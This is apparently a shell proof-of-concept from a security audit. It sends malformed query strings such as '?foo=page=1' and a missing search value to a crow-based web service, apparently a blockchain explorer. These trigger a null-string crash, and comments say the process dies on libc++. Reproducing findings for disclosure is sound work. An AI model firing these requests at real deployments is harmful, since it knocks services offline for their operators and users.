#!/bin/sh
# Finding 1 -- null query parameter. No flags required for case A.
# Expect: worker logs "Worker Crash: ... basic_string: construction from null is
# not valid" and the connection hangs / closes without a response body.
# On libstdc++ the process SURVIVES (std::logic_error is caught by crow's worker
# loop); on libc++ this is a SIGSEGV and the process dies.
HOST="${1:-http://127.0.0.1:8081}"

echo "[A] GET /search with no value= parameter"
curl -sS -m 10 -o /dev/null -w '  http_code=%{http_code} size=%{size_download}\n' "$HOST/search" || echo "  (no response -- connection dropped)"

echo "[B] GET /api/transactions?foo=page=1  (regex guard passes, key lookup misses)"
curl -sS -m 10 -o /dev/null -w '  http_code=%{http_code} size=%{size_download}\n' "$HOST/api/transactions?foo=page=1" || echo "  (no response -- connection dropped)"

echo "[C] control: GET /api/transactions?page=1 (guard and lookup agree)"
curl -sS -m 10 -o /dev/null -w '  http_code=%{http_code} size=%{size_download}\n' "$HOST/api/transactions?page=1" || echo "  (no response)"

echo
echo "Other parameters reachable the same way (--enable-json-api):"
for p in limit grace_blocks txhash address viewkey startblock endblock; do
  echo "  $HOST/api/outputs?foo=$p=1"
done
